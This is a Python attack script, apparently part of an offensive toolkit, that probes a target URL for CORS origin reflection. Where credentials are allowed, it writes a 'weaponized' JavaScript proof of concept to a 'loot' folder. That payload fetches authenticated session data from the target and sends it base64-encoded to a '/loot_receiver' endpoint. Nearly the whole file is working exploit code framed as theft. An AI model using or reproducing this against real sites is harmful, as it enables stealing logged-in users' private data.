import sys
import requests
import os

def exploit_cors(target_url, attacker_domain):
    """
    Tests for CORS misconfigurations: Origin reflection, null origin trust, 
    and credential exposure. Generates a weaponized JS PoC.
    """
    print(f"[*] Testing CORS Vulnerabilities on: {target_url}")
    print(f"[*] Simulating Origin: {attacker_domain}")
    
    headers = {
        "Origin": attacker_domain,
        "User-Agent": "Chimera-Sovereign/13.5"
    }

    try:
        # Initial probe with attacker-controlled origin
        r = requests.get(target_url, headers=headers, timeout=10, verify=False)
        
        reflects = r.headers.get("Access-Control-Allow-Origin")
        creds = r.headers.get("Access-Control-Allow-Credentials")

        print("-" * 60)
        if reflects == attacker_domain:
            print(f"[!!!] VULNERABLE: Origin Reflection detected.")
            if creds == "true":
                print("[!!!] CRITICAL: Access-Control-Allow-Credentials is TRUE.")
                print("[*] Generating Weaponized JavaScript PoC...")
                
                poc = f"""
<script>
    var xhr = new XMLHttpRequest();
    var url = "{target_url}";
    xhr.open("GET", url, true);
    xhr.withCredentials = true; // Steal authenticated session data
    xhr.onreadystatechange = function() {{
        if (xhr.readyState == 4) {{
            fetch('/loot_receiver?data=' + btoa(xhr.responseText));
        }}
    }};
    xhr.send();
</script>
                """
                
                loot_file = os.path.join("..", "loot", f"cors_poc_{os.getpid()}.html")
                with open(loot_file, "w") as f:
                    f.write(poc)
                print(f"[+] PoC archived in: {loot_file}")
            else:
                print("[!] Origin reflects, but credentials are not allowed. Low-impact leak only.")
        
        elif reflects == "*":
            print("[!] Wildcard Origin detected. Credential theft impossible, but public data is exposed.")
        
        else:
            print("[-] No Origin reflection. Target appears patched or uses static Allow-List.")
        print("-" * 60)

    except Exception as e:
        print(f"[-] Execution Fault: {e}")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: 130_cors <target_url> <attacker_domain_url>")
        sys.exit(1)
    
    exploit_cors(sys.argv[1], sys.argv[2])
